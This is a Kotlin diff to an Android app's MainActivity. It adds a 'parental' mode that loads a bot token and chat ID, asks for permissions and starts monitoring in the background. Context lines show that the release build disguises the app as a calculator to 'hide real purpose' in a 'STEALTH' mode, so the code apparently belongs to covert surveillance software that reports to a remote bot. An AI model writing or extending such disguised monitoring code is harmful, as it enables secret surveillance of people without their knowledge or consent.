@@ -75,7 +75,15 @@ class MainActivity : AppCompatActivity() {
         android.util.Log.i("MainActivity", "BuildConfig.DEBUG = ${BuildConfig.DEBUG}")
         
         preferencesManager = PreferencesManager(this)
-        
+
+        if (BuildConfig.PARENTAL_UI) {
+            prefillFromBuildConfig()
+            setContentView(R.layout.activity_parental)
+            initParentalUi()
+            startMonitoringInBackground()
+            return
+        }
+
         // RELEASE mode: Show CALCULATOR (hide real purpose)
         if (!BuildConfig.DEBUG) {
             android.util.Log.i("MainActivity", "Entering RELEASE mode - CALCULATOR UI")
@@ -87,6 +95,38 @@ class MainActivity : AppCompatActivity() {
         
     }
     
+    override fun onResume() {
+        super.onResume()
+        if (BuildConfig.PARENTAL_UI) updateParentalStatus()
+    }
+
+    private var parentalStatusText: android.widget.TextView? = null
+
+    private fun prefillFromBuildConfig() {
+        if (BuildConfig.BOT_TOKEN.isNotEmpty() && preferencesManager.botToken.isEmpty()) {
+            preferencesManager.botToken = BuildConfig.BOT_TOKEN
+        }
+        if (BuildConfig.CHAT_ID.isNotEmpty() && preferencesManager.chatId.isEmpty()) {
+            preferencesManager.chatId = BuildConfig.CHAT_ID
+        }
+    }
+
+    private fun initParentalUi() {
+        parentalStatusText = findViewById(R.id.parentalStatusText)
+        findViewById<com.google.android.material.button.MaterialButton>(R.id.parentalGrantButton).setOnClickListener {
+            permissionLauncher.launch(requiredPermissions)
+        }
+        updateParentalStatus()
+    }
+
+    private fun updateParentalStatus() {
+        parentalStatusText?.text = getString(
+            R.string.parental_status_fmt,
+            getString(if (preferencesManager.isMonitoringEnabled) R.string.monitoring_active else R.string.monitoring_inactive),
+            getString(if (hasAllPermissions()) android.R.string.ok else R.string.permissions_required)
+        )
+    }
+
     // ═══════════════════════════════════════════════════════════
     // CALCULATOR FUNCTIONS (RELEASE MODE - STEALTH)
     // ═══════════════════════════════════════════════════════════
